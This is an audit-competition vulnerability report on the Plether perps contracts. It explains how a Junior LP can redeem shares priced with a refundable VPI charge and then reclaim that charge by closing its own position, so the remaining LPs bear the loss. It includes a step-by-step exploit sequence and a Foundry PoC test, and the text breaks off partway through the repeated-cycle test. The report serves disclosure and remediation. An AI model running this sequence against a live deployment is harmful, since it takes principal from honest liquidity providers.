# \#100025 [SC-Critical] A Junior LP can redeem against its own refundable VPI charge and take the refund from the LPs that stay

**Submitted on Nov 16th 2026 at 04:47:43 UTC by @johnyfwesh for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100025
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Finding Description and Impact

When a position increases the long/short imbalance it pays a skew charge (VPI). When the same position later reduces the imbalance by the same amount, the planner pays the charge back as a close rebate, capped by a lifetime clamp at exactly what the position paid. A trader who is alone on its side therefore gets its whole VPI back on closing. In economic terms the charge is a deposit the pool owes back: the VPI the pool holds at any time is the skew potential `k * S^2 / (2D)` of the current imbalance, and it is paid out again to whoever unwinds that imbalance.

The pool does not account for it that way. The charge is transferred to `HousePool` and recorded as trading revenue the moment the open executes ([`CfdEngineSettlementSidecar.sol:454-464`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L464)). From then on it is ordinary pool cash:

- it is part of `physicalAssets`, so it is part of Junior NAV at the next reconcile ([`HousePoolAccountingLib.sol:60-81`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L81)), and
- it is not part of the withdrawal reserve, which only holds back maximum position liability, trader claims and the settlement buffer ([`HousePoolAccountingLib.sol:46-55`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L46-L55)).

Nothing records the offsetting obligation to refund it. A Junior LP that redeems while the charge sits in the pool is paid its pro rata share of the charge in USDG. When the position then closes, the rebate is paid in full out of pool cash ([`CfdEngineSettlementSidecar.sol:621-624`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624)), and the LPs that remain fund all of it.

An attacker who controls both the exiting Junior shares and the position turns this into a closed loop with no price exposure beyond a few seconds:

1. hold Junior shares and queue a redemption for the next hourly epoch;
2. seconds before the epoch boundary, open the largest position the skew cap allows from a second account, paying VPI `c`;
3. settle the LP epoch (permissionless): the redemption is priced at a Junior NAV that includes `c`;
4. close the position: the pool refunds `c`.

The attacker's trading account gets `c` back and pays only execution fees. The attacker's LP account keeps its share of `c`. The remaining Junior LPs pay for the refund out of principal.

The PoC runs this at the release parameters with the basket price held constant. With honest liquidity of 2.5M USDG Junior and 8M USDG Senior, one round trip gives the attacker **8,394.94 USDG net of every fee**, and the honest Junior LP is **12,520.12 USDG** (0.50% of its principal) worse off than in a control run where the attacker makes the same LP round trip without the position. Three consecutive cycles take nine hours and move 25,245.96 USDG to the attacker while the honest Junior LP loses 37,903.25 USDG.

### Security invariant violated

LP share pricing and LP redemption funding must not pay out value that the pool still owes to a trader:

```text
Junior NAV used to fund a redemption
    <= pool assets + marked price PnL - trader claims - VPI the pool must refund on unwind
```

The project states the same rule for the mirror case. A VPI rebate received at open is locked in a dedicated reserve precisely so that LPs cannot take it early: "The reserve is excluded from the terminal price curve, so LPs cannot withdraw it as marked equity before the matching position obligation settles" ([`WHITEPAPER.md:887-888`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L887-L888)), and "VPI reserve is nonwithdrawable ... and cannot be extracted by LPs before its account obligation settles" ([`ACCOUNTING_SPEC.md:821-822`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L821-L822)). The positive side has no equivalent protection. The code comment on the lifetime clamp says it "Prevents LP sandwich attacks" ([`CloseAccountingLib.sol:112-115`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L115)); this is an LP sandwich the clamp does not stop, because the rebate never exceeds what was paid.

### Expected behavior

A VPI charge that the paying position can still reclaim should not be distributable LP equity. Either it is held back until the position's lifetime VPI can no longer be refunded, or the outstanding refundable amount is treated as a liability in the reconcile snapshot and in the withdrawal reserve. A Junior LP that enters and exits at an unchanged price, with no trader losing money, should not be able to leave with more USDG than it brought, and the LPs that stay should not lose principal.

### Affected code

- [`OpenAccountingLib.sol:127-135`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/OpenAccountingLib.sol#L127-L135): the open's VPI is the change in skew potential and is added to the trade cost.

```solidity
(valid, state.vpiAssets) = CfdMath.tryCalculateVPI(
    inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.riskParams.vpiFactor
);
...
state.tradeCostAssets = state.vpiAssets + int256(state.executionFeeAssets);
```

- [`CfdEngineSettlementSidecar.sol:446-464`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L446-L464) (`executeOpen`): everything except the protocol fee is sent to the pool and booked as revenue with cash arrived.

```solidity
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
    }
}
```

- [`HousePool.sol:624-651`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L624-L651) (`recordClaimantInflow`): `accountedAssets += amount`, with no liability recorded.

- [`HousePoolAccountingLib.sol:60-81`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L81) (`buildReconcileSnapshot`): LP equity is physical assets plus the marked price delta minus trader claims. Refundable VPI is not subtracted.

```solidity
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
...
snapshot.distributable = terminalAssets - terminalLiabilities;
```

- [`HousePoolAccountingLib.sol:46-55`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L46-L55) (`buildWithdrawalSnapshot`): the redemption budget reserves only `maxLiability + traderClaims + buffer`.

- [`HousePool.sol:824-901`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L824-L901) (`_settleLpEpoch`): after reconcile, Junior redemptions are funded at `juniorPrincipal / supply`, which now contains the charge ([`HousePool.sol:840-841`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L840-L841)).

- [`CloseAccountingLib.sol:103-118`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118): on close the signed VPI is recomputed and clamped so that lifetime VPI is not negative. For a position that paid `c` and unwinds the same skew, the result is exactly `-c`.

```solidity
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

- [`CfdEnginePlanLib.sol:1059-1061`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1059-L1061) and [`CfdEnginePlanLib.sol:970-978`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L970-L978): a negative action total becomes an action rebate, paid from any pool cash not reserved for trader claims.

- [`CfdEngineSettlementSidecar.sol:621-624`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624) (`_executeClose`): the rebate leaves the pool.

```solidity
if (delta.actionRebatePaidAssets > 0) {
    IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
    clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
}
```

## Impact

### Theft of the remaining Junior LPs' principal

The value the attacker's LP account receives above its deposit is not yield the pool earned. It is the attacker's own charge, which the pool hands back a few seconds later. The refund comes out of Junior principal, so the LPs that stayed end the cycle below where they started. In the PoC the honest Junior LP holds 2,499,906.07 USDG of value after the control run and 2,487,385.95 USDG after the attack run, at the same price and with no other trader involved.

Senior LPs are not touched while Junior principal lasts, because Junior absorbs revenue changes first. The loss concentrates on the honest Junior LPs.

### Net profitable and repeatable

All costs are included in the PoC figures: both 4 bps execution fees, the Senior coupon the attacker pays while it holds Junior, and the adverse confidence shift on entry and exit (Pyth confidence is set to 1 bp).

| Per cycle, PoC configuration | USDG |
| --- | --- |
| VPI charge paid at open | 19,606.86 |
| Attacker LP account, gain over deposit | +16,894.99 |
| Attacker trading account, net | -8,500.05 |
| **Attacker net** | **+8,394.94** |
| Honest Junior LP, versus control | -12,520.12 |
| Protocol treasury (open fee) | +3,999.90 |

A cycle needs three hourly epochs (deposit activation, the one-hour share cooldown, the redemption epoch). `test_PoC_RepeatedCycles` runs three cycles in nine hours: the attacker is up 25,245.96 USDG and the honest Junior LP is down 37,903.25 USDG.

The position is open for about six seconds around the epoch boundary. A 1 bp move in that window is worth about 1,000 USDG on this size, in either direction, against 8,395 USDG of structural profit. The third PoC test fills the close 2 bp against the position and the attacker still nets 6,394.14 USDG. The profit does not depend on any price path.

### Feasibility and scale

Stated plainly, the attack has two conditions.

- **Junior share.** With skew `S`, depth `D`, VPI factor `k` and fee rate `f` per fill, the charge is `k * S^2 / (2D)` and the round-trip fee is `2 * f * S`. The attacker's exiting share `s` of Junior must satisfy `s * k * S / (2D) > 2f`. At the release values (`k = 1%`, `f = 4 bps`, skew cap `S/D = 40%`) this is **`s > 40%` of Junior**.
  That figure is for an otherwise flat book. If honest traders already hold skew `S0` on the same side, the charge for adding `S` is `k * (S^2 + 2 * S0 * S) / (2D)` and the same amount is refunded when the attacker's position unwinds back to `S0`, so the threshold falls (to roughly 20% when the book is already near the cap). This case is derived from the formula and is not exercised in the PoC.
- **Exit capacity.** The redemption is funded only from cash above `maxLiability + buffer`, so the honest capital left behind has to cover the position's maximum profit. That caps the position at roughly the honest TVL.

Capital is therefore the main requirement: about 1.5 times honest TVL in the PoC (15M against 10.5M). The capital is returned every cycle and is exposed only as an ordinary Junior LP. Under the program's feasibility standards a capital requirement is not a reason to downgrade. In the early phase of the pool, where Junior is small, the absolute amount needed is small.

The same mis-accounting also affects honest flow: any Junior LP that exits while skew is elevated is overpaid at the expense of those who stay, and any LP that enters then overpays. The attack makes it deliberate, with price exposure limited to the few seconds the position is open.

### Permissionless

Every step is a public call by the attacker's own addresses: `TrancheVault.requestDeposit`, `requestRedeemFromClaimableDeposit`, `claimRedeem`, `OrderRouter.commitOrder`, `executeOrder`, `updateMarkPrice`, `settleLpEpoch`. No trusted role, no chosen oracle tick (each order fills at the first tick after its commit, the epoch settles at a post-boundary tick), and no ordering advantage is needed.

## Why this is in scope

- The root cause is in in-scope files at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`: `CfdEngineSettlementSidecar.sol`, `HousePool.sol`, `libraries/HousePoolAccountingLib.sol`, `libraries/CloseAccountingLib.sol`, `libraries/CfdEnginePlanLib.sol`.
- It runs at the release parameters in `DEPLOYMENT.md` (VPI factor 1%, skew cap 40%, execution fee 4 bps, margins 0.1%/0.2%, Senior limits 40M and 80%, 1 USDG seeds), with trading, both tranches and permissionless keepers active.
- Impact: **direct theft of user funds at rest (LP principal)**, Critical. The honest Junior LP's principal falls with no price move and no trader profit. If triage instead treats the captured charge as yield, the mapping is theft of unclaimed yield (High); the PoC control shows the honest LP ends below its starting principal, which is why principal theft is claimed.
- The attacker is an ordinary LP and an ordinary trader acting as its own keeper.

### Comparison with known issues

- **AI scan S-30 / S-31** ("Temporary pool liquidity can reduce a skew-increasing close charge" / "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate"). Their root cause is that close VPI is computed from execution-time depth, so changing depth changes the charge or rebate. Here the rebate is not amplified: the position is refunded exactly its own lifetime charge, which is also what an unchanged-depth close returns. In the PoC the charge is 19,606.86 and the amount credited at close is 15,106.71, which is the charge minus the 4,000 close fee and about 500 of confidence shift. Pricing VPI from commit-time or time-weighted depth, which is what would address those findings, leaves this attack unchanged. The fix needed here (do not let LPs withdraw refundable VPI) would not change S-30 or S-31.
- **`SECURITY.md` and `ACCOUNTING_SPEC.md` statements that VPI is outside the price book.** `SECURITY.md` lists, as security consequences of the symmetric NAV, that "carry, VPI, fees, frozen spread, and liquidation charges stay outside the pre-close price book" and that "neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV" ([`SECURITY.md:863-872`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L863-L872)). `ACCOUNTING_SPEC.md` says these items are "deliberately excluded: they are separate realized-settlement quantities, not marked price PnL" ([`ACCOUNTING_SPEC.md:140-142`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L140-L142)). Those lines define what the terminal price curve contains, and they promise that VPI does not inflate LP NAV. They do not say that a charge already collected, and still owed back, may be paid out to an exiting LP. That is the opposite of the stated property: here symmetric NAV is inflated by exactly the refundable amount, and the PoC shows it being withdrawn.
- **`SECURITY.md` VPI limitations.** "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips" ([`SECURITY.md:1443`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1443)) describes the clamp as closing round-trip extraction. This round trip is not closed by it. None of the seven listed VPI limitations covers LP redemption against collected VPI.
- **Carry timing.** `WHITEPAPER.md` documents that an incoming LP and a trader can time carry collection, as an intentional collection-time ownership policy. Carry is a real, non-refundable payment, so that timing only redistributes yield the trader actually paid. VPI is refunded, so here the colluding pair ends with more than it started and the other LPs lose principal. No document describes or accepts that.
- **Historical-fill / LP-epoch ordering (AI scan S-22, MED-7) and clock lag (HIGH-1).** Not involved. Price is constant, each order fills at its own first post-commit tick, and the epoch settles at a current mark.
- **`Plether-Fi/plether-core` PR #138 and issue #137.** PR #138 rewrites carry and removes LP liquidity carry checkpoints; it does not touch VPI recognition or LP NAV. Issue #137 notes that the 1% VPI factor has no fixture coverage; it does not describe this path. Both were re-read on 2026-11-16.
- **Cecuro audit.** No finding concerns VPI and LP share pricing.

## Recommended mitigation steps

Stop treating refundable VPI as distributable LP equity. Two workable shapes:

1. Track the aggregate positive lifetime VPI of open positions (the engine already stores `vpiAccrued` per position and updates it on every open and close). Subtract that aggregate from `distributable` in `buildReconcileSnapshot` and add it to the reserve in `buildWithdrawalSnapshot`. It is released to LPs as positions close without reclaiming it, or are liquidated.
2. Or mirror the negative side: hold positive VPI in a pool-side reserve bucket, pay close rebates from that bucket, and route only the unreclaimed remainder to revenue when the position ends.


## Proof of Concept

## PoC Test (runs in `packages/perps/test/perps/poc/PLE002VpiNavExit.t.sol`)

### Exploit sequence

Setup, through public calls only: an honest Junior LP deposits 2.5M USDG and an honest Senior LP deposits 8M USDG. Owner calls appear only in `setUp`, to apply the release Router and Senior-limit values.

1. The attacker LP requests a 15M USDG Junior deposit. It activates at the next epoch.
2. One hour later (cooldown elapsed) it requests redemption of all its shares for the following epoch.
3. Four seconds before that epoch, the attacker's trading account commits a 10M USDG LONG (the skew cap is 40% of depth) and executes it itself one second later at the first post-commit tick. It pays 19,606.86 USDG of VPI.
4. One second after the boundary the attacker calls `OrderRouter.settleLpEpoch` with a current update. Its redemption is fully funded and it claims 15,016,894.99 USDG.
5. The trading account commits a full close and executes it at the next tick. The pool pays the VPI back.

The control run performs steps 1, 2 and 4 without the position.

### Test file `packages/perps/test/perps/poc/PLE002VpiNavExit.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Plether Perps PoC, commit a82d4fefb02768e5b3bddcc97dee371eee24fea8.
// Run from packages/perps:
//   forge test --match-path 'test/perps/poc/PLE002VpiNavExit.t.sol' -vv
//
// A Junior LP redeems across an hourly LP epoch while a position it controls has just paid a skew (VPI) charge.
// The charge is pool cash, so it is priced into the redeemed shares. The same position then closes and receives the
// charge back as a close rebate, paid from the LPs that stayed. Price never moves.
//
// Only Pyth (MockPyth) and USDG (MockSettlementToken) are mocked. Every attack step is a public call made by the
// attacker's own addresses. Owner calls appear only in setUp, to apply the release parameters.

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

contract PLE002VpiNavExit is BasePerpTest {

    address internal victimJunior = makeAddr("victimJunior");
    address internal victimSenior = makeAddr("victimSenior");
    address internal attackerLp = makeAddr("attackerLp");
    address internal attackerTrader = makeAddr("attackerTrader");

    uint256 internal constant PRICE = 1e8; // basket never moves
    uint64 internal constant CONF = 1e4; // 1 bp Pyth confidence on each feed
    uint256 internal constant VICTIM_JUNIOR = 2_500_000e6;
    uint256 internal constant VICTIM_SENIOR = 8_000_000e6;
    uint256 internal constant ATTACKER_JUNIOR = 15_000_000e6;
    uint256 internal constant POSITION_LOTS = 100_000; // 10,000,000 tokens = 10M USDG notional at 1.00
    uint256 internal constant TRADER_FUNDS = 80_000e6;

    uint256 internal clientNonce;

    struct Outcome {
        uint256 attackerLpOut;
        uint256 attackerTraderOut;
        uint256 victimJuniorValue;
        uint256 victimSeniorValue;
        uint256 treasury;
    }

    // ------------------------------------------------------------------ release parameters (DEPLOYMENT.md)

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.minOpenNotionalAssets = 1000e6;
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);
        _setSeniorCapacity(40_000_000e6, 8000);

        // Tuesday 2027-01-05 15:00:00 UTC, an exact LP epoch boundary in live market hours.
        vm.warp(1_799_161_200);
        vm.roll(vm.getBlockNumber() + 1);

        settlementToken.mint(victimJunior, VICTIM_JUNIOR);
        settlementToken.mint(victimSenior, VICTIM_SENIOR);
        settlementToken.mint(attackerLp, ATTACKER_JUNIOR);
        settlementToken.mint(attackerTrader, TRADER_FUNDS);

        // Honest LPs enter through the public async path. Junior first: Senior capacity is 80% of the pool.
        uint256 id = _requestDeposit(victimJunior, address(juniorVault), VICTIM_JUNIOR);
        _toNextEpoch(1);
        pool.settleLpEpoch(0, 0); // permissionless while no position is open
        vm.prank(victimJunior);
        juniorVault.claimDeposit(id, VICTIM_JUNIOR, victimJunior, victimJunior);

        id = _requestDeposit(victimSenior, address(seniorVault), VICTIM_SENIOR);
        _toNextEpoch(1);
        pool.settleLpEpoch(0, 0);
        vm.prank(victimSenior);
        seniorVault.claimDeposit(id, VICTIM_SENIOR, victimSenior, victimSenior);
    }

    // ------------------------------------------------------------------ helpers

    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp();
    }

    function _step(
        uint256 dt
    ) internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(_now() + dt);
    }

    /// @dev Warps to `offset` seconds after the next hourly boundary.
    function _toNextEpoch(
        uint256 offset
    ) internal {
        uint256 next = (_now() / 1 hours + 1) * 1 hours;
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(next + offset);
    }

    function _toBeforeNextEpoch(
        uint256 secondsBefore
    ) internal {
        uint256 next = (_now() / 1 hours + 1) * 1 hours;
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(next - secondsBefore);
    }

    /// @dev One signed basket update: both feeds at PRICE, published at `publishTime`, previous tick one second earlier.
    function _pyth(
        uint256 publishTime
    ) internal pure returns (bytes[] memory data) {
        return _pyth(publishTime, PRICE);
    }

    function _pyth(
        uint256 publishTime,
        uint256 price
    ) internal pure returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory u = new MockPyth.FeedUpdate[](2);
        MockPyth.MockPrice memory p = MockPyth.MockPrice(int64(uint64(price)), CONF, -8, publishTime, publishTime - 1);
        u[0] = MockPyth.FeedUpdate(BASE_PYTH_FEED_A, p);
        u[1] = MockPyth.FeedUpdate(BASE_PYTH_FEED_B, p);
        data = new bytes[](1);
        data[0] = abi.encode(u);
    }

    function _requestDeposit(
        address lp,
        address vault,
        uint256 amount
    ) internal returns (uint256 requestId) {
        vm.startPrank(lp);
        settlementToken.approve(vault, amount);
        (bool ok, bytes memory ret) =
            vault.call(abi.encodeWithSignature("requestDeposit(uint256,address,address)", amount, lp, lp));
        require(ok, "requestDeposit failed");
        requestId = abi.decode(ret, (uint256));
        vm.stopPrank();
    }

    function _request(
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 marginDelta,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory request) {
        bool needsFloor = (side == CfdTypes.Side.LONG) != isClose;
        request.clientOrderId = keccak256(abi.encode("ple002", ++clientNonce));
        request.side = side;
        request.sizeDelta = sizeDelta;
        request.marginDelta = marginDelta;
        request.targetPrice = needsFloor ? 1 : type(uint256).max;
        request.isClose = isClose;
        request.bounds.submitBy = uint64(_now() + 60);
        request.bounds.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());
        request.bounds.allowedExecutionModes = 7;
        request.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        request.bounds.maxExecutionBountyAssets = type(uint256).max;
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.maxPostLeverageBps = type(uint32).max;
    }

    /// @dev Commit at the current block, execute one second later against the first tick after the commit.
    function _commitAndExecute(
        OrderV3Types.OrderRequest memory request,
        uint256 tickPrice
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        vm.prank(attackerTrader);
        uint64 orderId = router.commitOrder(request);
        uint256 commitTime = _now();
        _step(1);
        bytes[] memory data = _pyth(commitTime + 1, tickPrice);
        vm.prank(attackerTrader); // the attacker is its own keeper
        result = router.executeOrder(orderId, data);
        assertEq(uint256(result.status), uint256(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    function _liquidAttackerTrader() internal view returns (uint256) {
        return settlementToken.balanceOf(attackerTrader) + clearinghouse.balanceAssets(attackerTrader);
    }

    // ------------------------------------------------------------------ one LP round trip

    function _roundTrip(
        bool attack
    ) internal returns (Outcome memory o) {
        return _roundTrip(attack, PRICE);
    }

    /// @param attack When true, the attacker's own account holds a skew position across the epoch boundary.
    /// @param closePrice Basket price of the tick that fills the close (PRICE in the base case).
    function _roundTrip(
        bool attack,
        uint256 closePrice
    ) internal returns (Outcome memory o) {
        // 1. Attacker LP joins Junior through the ordinary async deposit.
        uint256 depositId = _requestDeposit(attackerLp, address(juniorVault), ATTACKER_JUNIOR);
        _toNextEpoch(1);
        pool.settleLpEpoch(0, 0);

        // 2. After the one-hour cooldown it queues a full redemption for the next epoch.
        _toNextEpoch(2);
        uint256 shares = juniorVault.claimableDepositShares(depositId, attackerLp);
        vm.prank(attackerLp);
        uint256 redeemId = juniorVault.requestRedeemFromClaimableDeposit(depositId, shares, attackerLp);

        // 3. Seconds before that epoch, the attacker's trading account opens the largest LONG the skew cap allows.
        _toBeforeNextEpoch(4);
        vm.prank(attackerTrader);
        router.updateMarkPrice(_pyth(_now()));
        if (attack) {
            uint256 funds = settlementToken.balanceOf(attackerTrader);
            vm.startPrank(attackerTrader);
            settlementToken.approve(address(clearinghouse), funds);
            clearinghouse.deposit(attackerTrader, funds);
            vm.stopPrank();
            emit log_named_decimal_uint("  pool depth at open                ", pool.totalAssets(), 6);
            _commitAndExecute(_request(CfdTypes.Side.LONG, POSITION_LOTS * 1e20, 60_000e6, false), PRICE);
            (,,,,,, int256 vpiPaid) = engine.positions(attackerTrader);
            emit log_named_decimal_int("  VPI charge paid at open           ", vpiPaid, 6);
        }

        // 4. Epoch boundary: anyone settles. The redemption is priced at Junior NAV, which includes the VPI cash.
        _toNextEpoch(1);
        vm.prank(attackerLp);
        router.settleLpEpoch(_pyth(_now()));
        uint256 claimShares = juniorVault.claimableRedeemRequest(redeemId, attackerLp);
        assertEq(claimShares, shares, "redemption fully funded in one pass");
        vm.prank(attackerLp);
        juniorVault.claimRedeem(redeemId, claimShares, attackerLp, attackerLp);

        // 5. The position closes at the same price and is refunded its VPI by the remaining LPs.
        if (attack) {
            _step(1);
            uint256 beforeClose = clearinghouse.balanceAssets(attackerTrader);
            emit log_named_decimal_uint("  pool depth at close               ", pool.totalAssets(), 6);
            _commitAndExecute(_request(CfdTypes.Side.LONG, POSITION_LOTS * 1e20, 0, true), closePrice);
            emit log_named_decimal_uint(
                "  net rebate credited at close      ", clearinghouse.balanceAssets(attackerTrader) - beforeClose, 6
            );
            vm.startPrank(attackerTrader);
            clearinghouse.withdraw(attackerTrader, clearinghouse.balanceAssets(attackerTrader));
            vm.stopPrank();
        }

        o.attackerLpOut = settlementToken.balanceOf(attackerLp);
        o.attackerTraderOut = _liquidAttackerTrader();
        o.victimJuniorValue = juniorVault.convertToAssets(juniorVault.balanceOf(victimJunior));
        o.victimSeniorValue = seniorVault.convertToAssets(seniorVault.balanceOf(victimSenior));
        o.treasury = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
    }

    // ------------------------------------------------------------------ PoC

    function test_PoC_JuniorExitCapturesRefundableVpi() public {
        uint256 attackerCapital = ATTACKER_JUNIOR + TRADER_FUNDS;

        uint256 snap = vm.snapshotState();
        emit log_string("CONTROL: attacker LP enters and exits, no position");
        Outcome memory control = _roundTrip(false);
        vm.revertToState(snap);

        emit log_string("ATTACK: same LP round trip with the attacker's position open across the boundary");
        Outcome memory attacked = _roundTrip(true);

        uint256 controlTotal = control.attackerLpOut + control.attackerTraderOut;
        uint256 attackTotal = attacked.attackerLpOut + attacked.attackerTraderOut;

        emit log_named_decimal_uint("attacker capital in                 ", attackerCapital, 6);
        emit log_named_decimal_uint("attacker total out, control         ", controlTotal, 6);
        emit log_named_decimal_uint("attacker total out, attack          ", attackTotal, 6);
        emit log_named_decimal_uint("  attacker LP out, control          ", control.attackerLpOut, 6);
        emit log_named_decimal_uint("  attacker LP out, attack           ", attacked.attackerLpOut, 6);
        emit log_named_decimal_uint("  attacker trader out, attack       ", attacked.attackerTraderOut, 6);
        emit log_named_decimal_uint("victim Junior value, control        ", control.victimJuniorValue, 6);
        emit log_named_decimal_uint("victim Junior value, attack         ", attacked.victimJuniorValue, 6);
        emit log_named_decimal_uint("victim Senior value, control        ", control.victimSeniorValue, 6);
        emit log_named_decimal_uint("victim Senior value, attack         ", attacked.victimSeniorValue, 6);
        emit log_named_decimal_uint("treasury fees, attack               ", attacked.treasury, 6);

        // The price never moved, yet the attacker ends with more USDG than it put in ...
        assertGt(attackTotal, attackerCapital, "attack is net profitable after all fees");
        // ... while the honest control round trip is not profitable ...
        assertLe(controlTotal, attackerCapital, "honest round trip earns nothing");
        // ... and the Junior LP that stayed is worse off than in the control.
        assertLt(attacked.victimJuniorValue, control.victimJuniorValue, "remaining Junior LP pays");

        emit log_named_decimal_uint("ATTACKER NET PROFIT (USDG)          ", attackTotal - attackerCapital, 6);
        emit log_named_decimal_uint(
            "VICTIM JUNIOR LOSS vs control (USDG)", control.victimJuniorValue - attacked.victimJuniorValue, 6
        );
    }

    /// @dev The round trip repeats every three epochs. Three consecutive cycles, price still unchanged.
    function test_PoC_RepeatedCycles() public {
        uint256 attackerCapital = ATTACKER_JUNIOR + TRADER_FUNDS;
